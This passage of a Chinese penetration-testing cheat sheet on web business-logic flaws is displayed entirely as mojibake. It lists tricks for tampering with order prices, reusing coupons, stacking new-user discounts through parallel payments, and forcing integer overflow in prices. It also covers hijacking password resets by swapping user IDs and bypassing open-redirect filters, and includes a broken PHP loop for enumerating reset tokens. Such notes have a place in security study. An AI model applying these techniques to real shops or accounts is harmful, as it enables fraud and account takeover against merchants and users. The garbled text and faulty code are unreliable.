é‡ç½®ç”¨æˆ·å¯†ç äº†ã€‚ è®¢å•é‡‘é¢ä»»æ„ä¿®æ”¹#å¾ˆå¤šä¸­å°å‹çš„è´­ç‰©ç½‘ç«™éƒ½å­˜åœ¨è®¢å•é‡‘é¢ä»»æ„ä¿®æ”¹æ¼æ´ã€‚åœ¨æäº¤è®¢å•çš„æ—¶å€™æŠ“å–æ•°æ®åŒ…æˆ–è€…ç›´æ¥ä¿®æ”¹å‰ç«¯ä»£ç ï¼Œç„¶åå¯¹è®¢å•çš„é‡‘é¢ä»»æ„ä¿®æ”¹ã€‚ ç»å¸¸è§åˆ°çš„å‚æ•°å¤§å¤šä¸ºï¼šrmb ã€value ã€amount ã€cash ã€fee ã€money ç­‰ å…³äºæ”¯ä»˜çš„é€»è¾‘æ¼æ´è¿™ä¸€å—è¿˜æœ‰å¾ˆå¤šç§æ€è·¯ï¼Œæ¯”å¦‚ç›¸åŒä»·æ ¼å¢åŠ è®¢å•æ•°é‡ï¼Œç›¸åŒè®¢å•æ•°é‡å‡å°‘äº§å“ä»·æ ¼ï¼Œè®¢å•ä»·æ ¼è®¾å®šä¸ºè´Ÿæ•°ç­‰ç­‰ã€‚ æœªæˆæƒè®¿é—®#æœ‰äº›ä¸šåŠ¡çš„æ¥å£ï¼Œå› ä¸ºç¼ºå°‘äº†å¯¹ç”¨æˆ·çš„ç™»é™†å‡­è¯çš„è¾ƒéªŒæˆ–è€…æ˜¯éªŒè¯å­˜åœ¨ç¼ºé™·ï¼Œå¯¼è‡´é»‘å®¢å¯ä»¥æœªç»æˆæƒè®¿é—®è¿™äº›æ•æ„Ÿä¿¡æ¯ç”šè‡³æ˜¯è¶Šæƒæ“ä½œã€‚ ä¸€èˆ¬å®¹æ˜“å‡ºç°åœ¨æ–‡ä»¶å¯¼å‡ºä¸‹è½½ï¼ŒJSONæ•°æ®é¡µé¢ï¼Œç¬¬ä¸‰æ–¹åº”ç”¨é¡µé¢ç­‰ä½ç½®ã€‚ å¸¸è§æ¡ˆä¾‹ï¼š æŸç”µå•†åå°ä¸»é¡µé¢ï¼Œç›´æ¥åœ¨ç®¡ç†å‘˜webè·¯å¾„åé¢è¾“å…¥main.phpä¹‹ç±»çš„å³å¯è¿›å…¥ã€‚ æŸèˆªç©ºå…¬å¸è®¢å•IDæšä¸¾ æŸç”µå­è®¤è¯ä¸­å¿ƒæ•æ„Ÿæ–‡ä»¶ä¸‹è½½ æŸç«™è¶Šæƒæ“ä½œåŠç¼ºé™·ï¼Œå…¶ä¸»è¦åŸå› æ˜¯æ²¡å¯¹IDå‚æ•°åšcookieéªŒè¯å¯¼è‡´ å®é™…ä¸Šè¿˜æœ‰å¾ˆå¤šæ¡ˆä¾‹ï¼Œä»–ä»¬éƒ½å­˜åœ¨ä¸€ä¸ªå…±åŒçš„ç‰¹æ€§ï¼Œå°±æ˜¯æ²¡æœ‰å¯¹ç”¨æˆ·çš„ç™»é™†å‡­è¯è¿›è¡Œæ•ˆéªŒ æ¥å£æ— é™åˆ¶æšä¸¾#æœ‰äº›å…³é”®æ€§çš„æ¥å£å› ä¸ºæ²¡æœ‰åšéªŒè¯æˆ–è€…å…¶å®ƒé¢„é˜²æœºåˆ¶ï¼Œå®¹æ˜“é­åˆ°æšä¸¾æ”»å‡»ã€‚ å¸¸è§æ¡ˆä¾‹ï¼š æŸç”µå•†ç™»é™†æ¥å£æ— éªŒè¯å¯¼è‡´æ’åº“ æŸæ‹›è˜ç½‘éªŒè¯ç æ— é™åˆ¶æšä¸¾ æŸå¿«é€’å…¬å¸ä¼˜æƒ åˆ¸æšä¸¾ æŸç”µå•†ä¼šå‘˜å¡å¡å·æšä¸¾ æŸè¶…å¸‚æ³¨å†Œç”¨æˆ·ä¿¡æ¯è·å– cookietokenè®¾è®¡å­˜åœ¨ç¼ºé™·#cookieçš„æ•ˆéªŒå€¼è¿‡äºç®€å•ã€‚æœ‰äº›webå¯¹äºcookieçš„ç”Ÿæˆè¿‡äºå•ä¸€æˆ–è€…ç®€å•ï¼Œå¯¼è‡´é»‘å®¢å¯ä»¥å¯¹cookieçš„æ•ˆéªŒå€¼è¿›è¡Œä¸€ä¸ªæšä¸¾ã€‚æˆ–è€…é€šè¿‡ä¿®æ”¹cookieä¸­çš„æŸä¸ªå‚æ•°å¯ä»¥ç™»é™†å…¶ä»–ç”¨æˆ·ï¼Œå³cookieä»¿å†’ã€‚ tokenä¸€èˆ¬æ˜¯æ“ä½œä»¤ç‰Œï¼Œæ¯ä¸ªç”¨æˆ·åœ¨ç™»å½•ç³»ç»Ÿæ—¶ï¼ŒæœåŠ¡å™¨ä¼šä¸ºæ¯ä¸ªç”¨æˆ·ç”Ÿæˆtokenä»¤ç‰Œä½œä¸ºæ“ä½œå‡­è¯ã€‚å¦‚æœtokenè®¾è®¡å¤ªè¿‡äºç®€å•ï¼Œé‚£ä¹ˆå¯èƒ½ä¼šè¢«ç ´è§£ï¼›æˆ–è€…tokenæ²¡æœ‰è®¾ç½®è¿‡æœŸçš„æ—¶é—´ï¼Œä½¿å¾—ç”¨æˆ·tokenä¸å”¯ä¸€ï¼Œå¯¼è‡´ç”¨æˆ·tokenå­˜åœ¨è¢«ç›—ç”¨çš„é£é™©ã€‚ æ‰¾å›å¯†ç å­˜åœ¨è®¾è®¡ç¼ºé™·#authè®¾è®¡ç¼ºé™· ç»å¸¸ç ”ç©¶é€»è¾‘æ¼æ´çš„äººå¯èƒ½ä¼šå¯¹ä»¥ä¸‹URLå¾ˆç†Ÿæ‚‰ www.xxx.com/resetpassword.php?id=MD5 ç”¨æˆ·ä¿®æ”¹å¯†ç æ—¶ï¼Œé‚®ç®±ä¸­ä¼šæ”¶åˆ°ä¸€ä¸ªå«æœ‰authçš„é“¾æ¥ï¼Œåœ¨æœ‰æ•ˆæœŸå†…ç”¨æˆ·ç‚¹å‡»é“¾æ¥ï¼Œå³å¯è¿›å…¥é‡ç½®å¯†ç ç¯èŠ‚ã€‚è€Œå¤§éƒ¨åˆ†ç½‘ç«™å¯¹äºauthçš„ç”Ÿæˆéƒ½æ˜¯é‡‡ç”¨rand()å‡½æ•°ï¼Œé‚£ä¹ˆè¿™é‡Œå°±å­˜åœ¨ä¸€ä¸ªé—®é¢˜äº†ï¼ŒWindowsç¯å¢ƒä¸‹rand()æœ€å¤§å€¼ä¸º32768ï¼Œæ‰€ä»¥è¿™ä¸ªauthçš„å€¼æ˜¯å¯ä»¥è¢«æšä¸¾çš„ã€‚ å¦‚ä¸‹é¢è¿™ä¸ªä»£ç å¯ä»¥å¯¹authçš„å€¼åšä¸€ä¸ªå­—å…¸ã€‚ $a=0;for ($a=0;$a=32768;$a++) $b=md5($a); echo \\r ; echo $b; ç„¶åé‡ç½®æŸä¸ªè´¦å·ï¼Œå¹¶ä¸”å¯¹é‡ç½®é“¾æ¥å†…çš„authè¿›è¡Œæšä¸¾ã€‚ ç­¾çº¦æ¼æ´# ä½¿ç”¨Aæ‰‹æœºç™»é™†è´¦å·Aæ‰“å¼€è¦æµ‹è¯•çš„ä¸šåŠ¡ï¼Œç‚¹å‡»è‡ªåŠ¨ç»­è´¹ï¼Œæ”¯ä»˜æ—¶åœç•™åœ¨æ”¯ä»˜ç•Œé¢ã€‚ ä½¿ç”¨Bæ‰‹æœºç™»é™†è´¦å·Aæ‰“å¼€è¦æµ‹è¯•çš„ä¸šåŠ¡ï¼Œç‚¹å‡»è‡ªåŠ¨ç»­è´¹ï¼Œæ”¯ä»˜æ—¶åœç•™åœ¨æ”¯ä»˜ç•Œé¢ã€‚ é‡å¤å¤šå°æ‰‹æœºè¿›è¡ŒåŒæ ·æ“ä½œ Aæ‰‹æœºç‚¹å‡»æ”¯ä»˜è¿›è¡Œç­¾çº¦ Aæ‰‹æœºæ”¯ä»˜æˆåŠŸåï¼Œåœ¨ç¬¬ä¸‰æ–¹APPä¸­è§£é™¤è‡ªåŠ¨ç»­è´¹ Bæ‰‹æœºè¿›è¡Œæ”¯ä»˜ï¼Œæ”¯ä»˜æˆåŠŸååœ¨ç¬¬ä¸‰æ–¹APPä¸­è§£é™¤è‡ªåŠ¨ç»­è´¹ å…¨éƒ¨æ”¯ä»˜å®Œæˆåï¼Œç³»ç»Ÿå°±ä¼šä¸ºä½ å¼€é€šç›¸åº”çš„æ¬¡æ•°ï¼Œç”±äºæå‰æ‰“å¼€äº†æ”¯ä»˜ç•Œé¢ï¼Œæ‰€ä»¥é‡‘é¢éƒ½æ˜¯äº«å—åˆ°æ–°ç”¨æˆ·é¦–æœˆä¼˜æƒ çš„é‡‘é¢ã€‚ æœ€ç»ˆçš„æ•ˆæœæ˜¯ï¼Œä¸€ä¸ªè´¦æˆ·äº«å—åˆ°äº†å¤šæ¬¡æ–°ç”¨æˆ·é¦–æœˆä¼˜æƒ é‡‘é¢ï¼Œå³è¯æ˜æ¼æ´çš„å­˜åœ¨ã€‚ é€šå¸¸è¿™ç§æ¼æ´æ¯”è¾ƒå®¹æ˜“å‡ºç°åœ¨æ´»åŠ¨é¡µé¢çš„ä¼šå‘˜ä¼˜æƒ å¼€é€šï¼Œè€Œä¸”è¦è€ƒè™‘åˆ°æ”¯ä»˜åè¦æ¯”æ­£å¸¸è´­ä¹°ä¼˜æƒ æ‰ç®—æ˜¯æ¼æ´ã€‚ ä¼šå‘˜å‡çº§# ä½¿ç”¨Aæ‰‹æœºç™»é™†è´¦å·Aï¼Œå¹¶ä¸”å¼€é€šä¼šå‘˜ã€‚å¼€é€šè¶…çº§ä¼šå‘˜ï¼Œè¿›å…¥åˆ°å‡çº§é¡µé¢ï¼Œè¿›è¡Œè¡¥é½å·®ä»·å¼€é€šã€‚ ä½¿ç”¨Bæ‰‹æœºç™»é™†è´¦å·Aï¼Œç‚¹å‡»å¼€é€šè¶…çº§ä¼šå‘˜ï¼Œè¿›å…¥åˆ°å‡çº§é¡µé¢ï¼Œè¿›è¡Œè¡¥é½å·®ä»·å¼€é€šã€‚ Aæ‰‹æœºè¿›è¡Œæ”¯ä»˜ï¼ŒBæ‰‹æœºè¿›è¡Œæ”¯ä»˜ã€‚æœåŠ¡å™¨è®¤ä¸ºä½ è¡¥é½äº†å¤šä¸ªæœˆä»½çš„è¶…çº§ä¼šå‘˜ï¼Œç„¶ååˆ°è´¦å¤šæ¬¡ã€‚ å…¶å®è¿™ä¸ªå’Œç­¾çº¦æ¼æ´çš„åŸç†å·®ä¸å¤šï¼Œç»•è¿‡äº†æ”¯ä»˜åæœåŠ¡å™¨æ‰å»æ ¡éªŒæ˜¯å¦å¯ä»¥å‡çº§çš„é€»è¾‘ã€‚ è®¢å•å…³é—­# ä½¿ç”¨ä¼˜æƒ åˆ¸åˆ›å»ºä¸€ä¸ªè®¢å•ï¼Œåœç•™åœ¨æ”¯ä»˜ç•Œé¢ å…³é—­è®¢å•ï¼Œè¿”å›ä¼˜æƒ åˆ¸ ä½¿ç”¨ä¼˜æƒ åˆ¸å†æ¬¡åˆ›å»ºè®¢å•ï¼›æŠŠç¬¬ä¸€ä¸ªæœªæ”¯ä»˜çš„è®¢å•è¿›è¡Œæ”¯ä»˜ å•†å“ä»å…³é—­ï¼Œé‡æ–°è¿›å…¥åˆ°äº†ä»£å‘è´§çš„é˜¶æ®µï¼Œä¼˜æƒ åˆ¸å´ä»ç„¶å­˜åœ¨ï¼Œå³è¯æ˜æ¼æ´å­˜åœ¨ æ”¯ä»˜é‡‘é¢# æœ‰äº›ä¸šåŠ¡åœ¨æ”¯ä»˜æ—¶ä¼šå¿½ç•¥åˆ†ä»¥åçš„å•ä½ï¼Œè¿™æ—¶å€™å°±å¯¼è‡´äº†å­˜åœ¨åˆ†å•ä½çš„é‡‘é¢ä¹Ÿå¯ä»¥ç”Ÿæˆè®¢å• æ¯”å¦‚0.0190.02ï¼Œåœ¨æ”¯ä»˜æ—¶å®¢æˆ·ç«¯ç»™æœåŠ¡å™¨ä¼ äº†0.019å…ƒçš„è®¢å•ã€‚è€Œç¬¬ä¸‰æ–¹ä»˜æ”¯é€šå¸¸æœ€å°çš„å•ä½ä¸ºåˆ† è¿™å°±å¯¼è‡´äº†è¿”å›çš„é‡‘é¢ä¼šå§åé¢çš„9å±è”½æ‰ï¼Œåªè¿”å›0.01ï¼ˆä¹Ÿæœ‰äº›ç›´æ¥å››èˆäº”å…¥å˜æˆ0.02çš„ï¼‰ å½“ä½ æ”¯ä»˜å®Œ0.01åï¼Œç¬¬ä¸‰æ–¹ä¼šé€šçŸ¥æœåŠ¡å™¨æ”¯ä»˜æˆåŠŸï¼Œè€ŒæœåŠ¡å™¨é‚£è¾¹ç”Ÿæˆçš„æ˜¯0.019ï¼Œå¯èƒ½è¿™ä¸ªè½¯ä»¶çš„ä¾¨èƒæœ€å°å•ä½ä¹Ÿæ˜¯åˆ†ï¼Œå››èˆäº”å…¥å˜æˆäº†0.02 intæ•´æ•°æº¢å‡º# æ³¨æ„ï¼šåœ¨åšæº¢å‡ºæµ‹è¯•æ—¶ï¼Œæœ‰å¯èƒ½å¯¼è‡´ç›®æ ‡æœåŠ¡å™¨å®•æœºï¼Œéœ€è¦å‘æˆæƒå•ä½ç”³è¯·æˆæƒåæ‰èƒ½è¿›è¡Œæµ‹è¯•ã€‚ intçš„èŒƒå›´æ˜¯-2147483648~2147483647ã€‚ä½ å¯ä»¥æŠŠå®ƒçœ‹ä½œæ˜¯ä¸€ä¸ªå¾ªç¯ï¼Œå½“è¶…è¿‡æœ€å¤§å€¼åå°±é‡æ–°ä»0å¼€å§‹è®¡ç®— æ¯”å¦‚2147483649-2147483647ã€‚æœ‰æ—¶å€™æ”¯ä»˜é‡Œé¢æ²¡æœ‰è´Ÿæ•°æ‰€ä»¥ä»0å¼€å§‹è®¡ç®—äº† å½“æ”¯ä»˜é‡‘é¢ä¸º2147483649æ—¶ï¼Œæ”¯ä»˜é‡‘é¢å°±å˜æˆäº†1ï¼Œå³2147483649-21474836481 æ”¯ä»˜çš„æ—¶å€™å¯ä»¥ç›´æ¥å§é‡‘é¢æ”¹æˆè¿™ä¸ªå€¼ï¼Œåœ¨æµ‹è¯•å•†å“æ—¶ä¹Ÿå¯ä»¥è®©æ€»ä»·æ ¼ä¸ºè¿™ä¸ªæ•°ã€‚2147483648ç‰©å“å•ä»·+1ç‰©å“æ•°é‡ ä»¥ä¸Šçš„åšæ³•ç›®çš„ï¼Œç®€å•çš„æ¥è¯´å°±æ˜¯é€šè¿‡æ•´æ•°æº¢å‡ºæ¥ä¿®æ”¹æ”¯ä»˜é‡‘é¢æˆ–è€…è´­ä¹°å•†å“æ•°é‡ã€‚ çªç ´æ—¶é—´é™åˆ¶#ä¸€äº›ç½‘ç«™ä¸­çš„é™æ—¶æ´»åŠ¨è®¾ç½®äº†æ´»åŠ¨æ—¶é—´èŒƒå›´ï¼Œå¯ä»¥é€šè¿‡æŠ“åŒ…å°è¯•æ›´æ”¹æ—¶é—´å‚æ•°ä¸ºæ´»åŠ¨æœªé™å®šèŒƒå›´å†…çš„ã€‚ å‰ç«¯éªŒè¯#å‰ç«¯åŠ å¯†ã€åç«¯è§£å¯†æ ¡éªŒã€‚æ¯”å¦‚åœ¨ç”¨æˆ·ç™»å½•æ—¶ï¼Œé€šè¿‡æŠ“åŒ…å‘ç°ç”¨æˆ·å¯†ç è¢«åŠ å¯†ä¼ è¾“äº†ï¼Œå¯ä»¥åˆ©ç”¨ä¸€äº›è§£å¯†å·¥å…·è¿›è¡Œç ´è§£ï¼Œå¦‚ï¼šBurpè§£å¯†æˆ–è€…ä¸€äº›åœ¨çº¿è§£å¯†ç½‘ç«™ã€‚ æš´åŠ›ç ´è§£æ’åº“#é¦–å…ˆåœ¨æ²¡æœ‰éªŒè¯ç æˆ–è€…éªŒè¯ç å¯ä»¥è¢«ç»•è¿‡çš„æƒ…å†µä¸‹ï¼Œå°è¯•5æ¬¡æˆ–è€…10æ¬¡è´¦å·å¯†ç ç™»é™†ï¼Œæ£€æµ‹ç›®æ ‡æ˜¯å¦å°ç¦è´¦æˆ·ï¼Œå¦‚æœæ²¡æœ‰å°ç¦è§„åˆ™ï¼Œå¯ä»¥ä¸æ–­è¿›è¡Œçˆ†ç ´ã€‚é‡‡ç”¨è´¦å·å¯†ç çˆ†ç ´ï¼Œå¯¹äºä¸€äº›å•†åŸã€åº”ç”¨ã€æ”¿åºœã€å­¦æ ¡é‡‡ç”¨æ’åº“æ–¹å¼åˆ¤æ–­æ˜¯å¦å­˜åœ¨è¯¥è´¦å·ï¼ˆéœ€è¦å‡†å¤‡å„ç±»å­—å…¸ï¼šæ‰‹æœºå·æ’åº“ã€é‚®ç®±æ’åº“ã€å§“åæ’åº“ï¼‰ã€‚ å¯†ç æ‰¾å›# é€šè¿‡é‚®ç®±æ‰¾å›å¯†ç ï¼Œè®¿é—®é“¾æ¥é‡ç½®å¯†ç ï¼Œè¾“å…¥æ–°å¯†ç åæäº¤æŠ“åŒ…ï¼Œè™½ç„¶æœ‰tokenï¼Œä½†æ˜¯ä¾ç„¶å¯ä»¥ç›´æ¥ä¿®æ”¹ç”¨æˆ·IDè¿›è€Œä¿®æ”¹ä»–äººå¯†ç  é€šè¿‡ä»–äººæ‰‹æœºå·æ‰¾å›å¯†ç ï¼ŒæŠ“åŒ…ï¼Œå°†ä»–äººæ‰‹æœºå·æ›¿æ¢ä¸ºè‡ªå·±çš„æ‰‹æœºå·ï¼Œè·å–éªŒè¯ç ï¼Œæäº¤åä¿®æ”¹å¯†ç  é€šè¿‡è‡ªå·±æ‰‹æœºå·æ‰¾å›å¯†ç ï¼Œè·å–éªŒè¯ç åæŠ“åŒ…ï¼Œå°†æ•°æ®åŒ…ä¸­çš„ç”¨æˆ·IDæ”¹ä¸ºä»–äººè´¦å·IDï¼Œæäº¤åæˆåŠŸä¿®æ”¹ä»–äººå¯†ç  é€šè¿‡é‚®ç®±æ‰¾å›å¯†ç ï¼ŒURLé“¾æ¥ä¸­ä¿®æ”¹ç”¨æˆ·IDä¸ºä»–äººï¼Œé‚®ç®±ä¸å˜ï¼Œä¹‹åé€šè¿‡é“¾æ¥å¯ä»¥å°†ä»–äººè´¦æˆ·ç»‘å®šä¸ºè‡ªå·±çš„é‚®ç®±ï¼Œä¹‹åé€šè¿‡é‚®ç®±æ‰¾å›å¯†ç  ä»»æ„urlè·³è½¬#urlè·³è½¬æ¼æ´ä¹Ÿå«å¼€å‘é‡å®šå‘æ¼æ´ï¼Œå¯ä»¥æŠŠç”¨æˆ·é‡å®šå‘åˆ°æ”»å‡»è€…è‡ªå·±æ„é€ çš„é¡µé¢å»ï¼Œç®€å•çš„è¯´å°±æ˜¯å¯ä»¥è·³è½¬åˆ°ä»»æ„æŒ‡å®šçš„urlã€‚ä¸€èˆ¬å‡ºç°åœ¨éªŒè¯è·³è½¬ã€ssoç™»é™†ç­‰ä½ç½®ã€‚ æœåŠ¡ç«¯æœªå¯¹ä¼ å…¥çš„è·³è½¬urlå˜é‡è¿›è¡Œæ£€æŸ¥å’Œæ§åˆ¶ï¼Œå¯èƒ½å¯¼è‡´å¯æ¶æ„æ„é€ ä»»æ„ä¸€ä¸ªæ¶æ„åœ°å€ï¼Œè¯±å¯¼ç”¨æˆ·è·³è½¬åˆ°æ¶æ„ç½‘ç«™ã€‚ å±å®³ï¼š ç½‘ç«™é’“é±¼ é…åˆCSRFæ“ä½œå±é™©è¯·æ±‚ é…åˆXSSæ‰§è¡ŒJSç›—å–cookie é…åˆæµè§ˆå™¨æ¼æ´ï¼ˆCVE-2018-8174ï¼‰ http://www.xxx.com?url=https://www.baidu.com æ›¿æ¢urlå‚æ•°åèƒ½å¤Ÿè·³è½¬åˆ°å¯¹åº”é¡µé¢ï¼Œä½†æ˜¯ä¸€äº›ç½‘ç«™å¯èƒ½ä¼šå¯¹urlè·³è½¬åšé™åˆ¶ï¼Œå¯ä»¥å°è¯•ç»•è¿‡bypass 1.åˆ©ç”¨é—®å·ç»•è¿‡é™åˆ¶,æœ€ç»ˆè·³è½¬åˆ°äº¬ä¸œé¡µé¢url=https://www.baidu.com?www.jd.com2.åˆ©ç”¨@ç»•è¿‡é™åˆ¶,æœ€ç»ˆè·³è½¬åˆ°äº¬ä¸œé¡µé¢url=https://www.baidu.com@www.jd.com3.åˆ©ç”¨æ–œæ†åæ–œæ ç»•è¿‡é™åˆ¶4.åˆ©ç”¨#ç»•è¿‡é™åˆ¶url=https://www.baidu.com@www.jd.com5.åˆ©ç”¨å­åŸŸåç»•è¿‡6.åˆ©ç”¨ç•¸å½¢urlç»•è¿‡7.åˆ©ç”¨è·³è½¬IPç»•è¿‡ æ”¯ä»˜é€»è¾‘æ¼æ´#åœ¨æ”¯ä»˜ç¯èŠ‚ä¸­ç”±äºé€»è¾‘ä¸ä¸¥è°¨è€Œäº§ç”Ÿçš„æ¼æ´ç§°ä¸ºæ”¯ä»˜æ¼æ´ã€‚ æµ‹è¯•æ€è·¯#åªè¦æœ‰å‚æ•°ï¼Œéƒ½å¯ä»¥ä¿®æ”¹ï¼Œéƒ½æœ‰å¯èƒ½å‡ºç°é—®é¢˜ã€‚ é€šå¸¸ä½¿ç”¨ä¸¤ä¸ªè´¦å·æ¥å¯¹æ¯”æµ‹è¯•ï¼Œè¿™æ ·å¯ä»¥æ›´å¿«å‘ç°å¯ç–‘å‚æ•° è®¢å•æ¨¡å—# ä¸‹å•ä¹‹åä¿®æ”¹å•†å“ä»·æ ¼ ä¸‹å•ä¹‹åæ›´æ”¹æ•°é‡è®¾ä¸ºè´Ÿæ•°ï¼Œäº§ç”Ÿæ­£è´Ÿé€»è¾‘ å¹¶å‘è´­ä¹°æ˜¯å¦å‡ºç°é€»è¾‘é—®é¢˜ å•†å“ä¸º0ï¼Œæ˜¯å¦å­˜åœ¨è´­ä¹°çš„å¯èƒ½ ç”Ÿæˆè®¢å•æ—¶ä¿®æ”¹è®¢å•é‡‘é¢ ç»“ç®—æ¨¡å—# ä¼˜æƒ åˆ¸é‡å¤åˆ©ç”¨ ä¿®æ”¹ç»“ç®—çŠ¶æ€ æ›´æ”¹æ”¯ä»˜APIæˆ–è€…æ”¯ä»˜æ¨¡å¼ ä¼ªé€ æˆåŠŸç»“ç®—è¯·æ±‚ é€€è´§æ¨¡å—# æ›´æ”¹è´§ç‰©çŠ¶æ€ æ›´æ”¹é€€è´§ä»·æ ¼ æ”¶è´§æ¨¡å—# ç»•è¿‡å®¢æˆ·ç›´æ¥ç¡®è®¤æ”¶è´§ è¾¹ç•Œå€¼é—®é¢˜#æ­£å¸¸çš„é€»è¾‘æ˜¯ç”¨æˆ·è´­ä¹°å•†å“ï¼Œç„¶åä»·æ ¼ç´¯åŠ å¾—åˆ°ä¸€ä¸ªæ€»ä»·è¿›è¡Œæ‰£æ¬¾ã€‚è¿™ä¸ªæ—¶å€™å°±ä¼šäº§ç”Ÿé€»è¾‘é—®é¢˜ï¼šå¦‚æœè¯´ç”¨æˆ·è´­ä¹°çš„å•†å“æ˜¯è´Ÿæ•°äº†ï¼Œé‚£ä¹ˆè®¡ç®—çš„æ€»æ•°å°±æ˜¯è´Ÿæ•°ã€‚åè¿‡æ¥é’±ç»™ç”¨æˆ· é¡ºåºæ‰§è¡Œç¼ºé™·#æ­£å¸¸çš„é€»è¾‘æ˜¯a-b-c-d å¾ªç¯æ¸è¿›çš„è¿›è¡Œæµç¨‹æ“ä½œã€‚è¿™ä¸ªæ—¶å€™å°±ä¼šäº§ç”Ÿé€»è¾‘é—®é¢˜ï¼šå¯ä»¥ç›´æ¥ä»ä¸­ç»•è¿‡æŸä¸€ä¸ªè¿‡ç¨‹è¿›å…¥åˆ°ä¸‹ä¸€æ­¥æ“ä½œã€‚å¦‚æœè¯´æœ‰ä¸€é¡¹æ˜¯æ”¯ä»˜çš„æ“ä½œï¼Œé‚£ä¹ˆä¹Ÿå°±ä¼šäº§ç”Ÿæ”¯ä»˜ç»•è¿‡ï¼Œå¦‚æœè¯´æœ‰ä¸€é¡¹æ˜¯éªŒè¯æœºåˆ¶ï¼Œå°±ä¼šç»•è¿‡éªŒè¯ç›´æ¥è¿›å…¥ä¸‹ä¸€æ­¥ã€‚ é‡‘é¢ç›´æ¥ä¼ è¾“å¯¼è‡´ç¯¡æ”¹#ç›´æ¥å¯¹ä¸‹å•çš„é‡‘é¢è¿›è¡Œä¿®æ”¹å€¼ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨fdæˆ–è€…burpæŠ“åŒ… ç¡®å®šæ”¯ä»˜ä¹‹åè¿˜å¯ä»¥åŠ å…¥è´­ç‰©è½¦#æŠŠå•†å“æ”¾å…¥è´­ç‰©è½¦ç‚¹å‡»ä¸‹å•æ”¯ä»˜ï¼Œä¼šè·³è½¬åˆ°å¾®ä¿¡ï¼Œæ”¯ä»˜å®ç­‰ç¬¬ä¸‰æ–¹æ”¯ä»˜å¹³å°ã€‚è¿™ä¸ªæ—¶å€™è¿˜å¯ä»¥ç»§ç»­åœ¨è´­ç‰©è½¦ä¸­åŠ å…¥å•†å“ï¼Œæ”¯ä»˜ç»“æŸä¹‹åï¼Œå•†å®¶å‘æ”¾çš„å•†å“æ˜¯ç°åœ¨çš„è´­ç‰©è½¦é‡Œé¢çš„ä¸œè¥¿ã€‚ è¯·æ±‚é‡æ”¾#è´­ä¹°æˆåŠŸä¹‹åï¼Œç»§ç»­é‡æ”¾è¯·æ±‚ï¼Œå¯ä»¥è®©è´­ä¹°çš„å•†å“ä¸€ç›´å¢åŠ ã€‚è´­ä¹°æˆåŠŸä¹‹åï¼Œä¼šæœ‰ä¸€ä¸ªé“¶è¡Œå¯¹å•†æˆ·ç½‘ç«™è·³è½¬çš„è¿‡ç¨‹ï¼Œå¦‚æœåå¤è¿›è¡Œæ“ä½œï¼Œæœ‰å‡ ç‡ä¼šå¯¼è‡´å•†å“åå¤è´­ä¹°å’Œå¢åŠ ï¼Œä½†æ˜¯ä¸éœ€è¦ä»˜æ›´å¤šçš„é’±ã€‚ è¯·æ±‚å‚æ•°å¹²æ‰°#é‡‘é’±åšäº†ç­¾åè®¤è¯ä¹‹åï¼Œä¿®æ”¹åä¸é€šè¿‡ï¼Œä½†æ˜¯åœ¨é‡Œé¢ä»ç„¶ä¼šæœ‰ä¸€ä¸ªå‚æ•°å¯¹é‡‘é¢äº§ç”Ÿå½±å“å¯¼è‡´é—®é¢˜äº§ç”Ÿã€‚ è®¢å•æ›¿æ¢#è®¢å•æ›¿æ¢å‘ç”Ÿåœ¨æ”¯ä»˜ä¹‹åçš„äº‹ä»¶å¤„ç†ï¼ŒåŒæ—¶å‘æœåŠ¡å™¨å‘èµ·äºŒæ¬¡æ”¯ä»˜è¯·æ±‚ä¸€ä¸ªå¤šä¸€ä¸ªå°‘ï¼Œæ”¯ä»˜é‡‘é¢å°‘çš„ï¼Œç„¶åæ”¯ä»˜ä¹‹åè¿›è¡Œæ›¿æ¢ï¼Œå‘ŠçŸ¥æœåŠ¡å™¨è®¢å•æ”¯ä»˜å®Œæˆï¼Œå¹¶ä¸”è¿‡ç¨‹å¯ä»¥åå¤çš„å›æ”¾ã€‚ æ¬ºè¯ˆ#éœ€è¦ä¸¤ä¸ªæ”¶æ¬¾äººï¼Œä¸€ä¸ªæ˜¯æ­£å¸¸çš„å•†å®¶ï¼Œä¸€ä¸ªæ˜¯ä¼ªé€ çš„å•†å®¶ å•ä½æ›¿æ¢#äº§ç”Ÿåœ¨paypalç±»ä¼¼çš„å›½é™…æ”¯ä»˜çš„åœºæ™¯ã€‚ ç”¨æˆ·æ›¿æ¢#åœ¨æ”¯ä»˜è¿‡ç¨‹ä¸­å‘ç”Ÿç”¨æˆ·æ›¿æ¢ç°è±¡ï¼Œé¦–å…ˆç™»é™†è‡ªå·±çš„è´¦æˆ·ï¼Œç„¶åå–å¾—å¦å¤–ä¸€ä¸ªäººçš„è´¦æˆ·åç­‰æœ‰æ•ˆä¿¡æ¯ï¼Œåœ¨ä¸šåŠ¡æµç¨‹ä¸­ç”¨å¯¹æ–¹çš„ç”¨æˆ·åæ›¿æ¢è‡ªå·±çš„ç”¨æˆ·åï¼Œç”¨å¯¹æ–¹çš„ä½™é¢è´­ä¹°å®Œæˆåï¼Œå†æ›¿æ¢è‡ªå·±çš„è´¦æˆ·åï¼Œè¿™æ ·å°±å½¢æˆåˆ«äººçš„é’±ä¹°è‡ªå·±çš„ä¸œè¥¿ å¼ºåˆ¶æ”»å‡»#å¼ºåˆ¶æ”»å‡»å‘ç”Ÿåœ¨æš´åŠ›ç ´è§£çš„æƒ…å†µä¸‹ï¼Œå¦‚æœä¸€ä¸ªå•†å®¶è¿ç”¨ä¸€ä¸ªè‡ªå·±çš„ç½‘åº—ï¼Œæ¥å…¥ç¬¬ä¸‰æ–¹æ”¯ä»˜æ¥å£ï¼Œç”±äºè®¾è®¡ä¸Šçš„ä¸å½“å¯¼è‡´å•†å®¶ä¸ç¬¬ä¸‰æ–¹æ”¯ä»˜çº¦å®šçš„å¯†é’¥Keyå¯ä»¥å•ç‹¬è¢«MD5åŠ å¯†ï¼Œå¯¼è‡´å¯ä»¥ä½¿ç”¨MD5ç¢°æ’æŠ€æœ¯å¯¹å¯†é’¥è¿›è¡Œç ´è§£ï¼Œæ”»å‡»è€…å¯ä»¥è®¾è®¡ç®€å•çš„å¯†é’¥åŠ å¯†ä¿¡æ¯ä½¿å¾—MD5åŠ å¯†æ˜¯å¯ä»¥ç”¨MD5ç¢°æ’æŠ€æœ¯è¿›è¡Œæš´åŠ›ç ´è§£ã€‚ 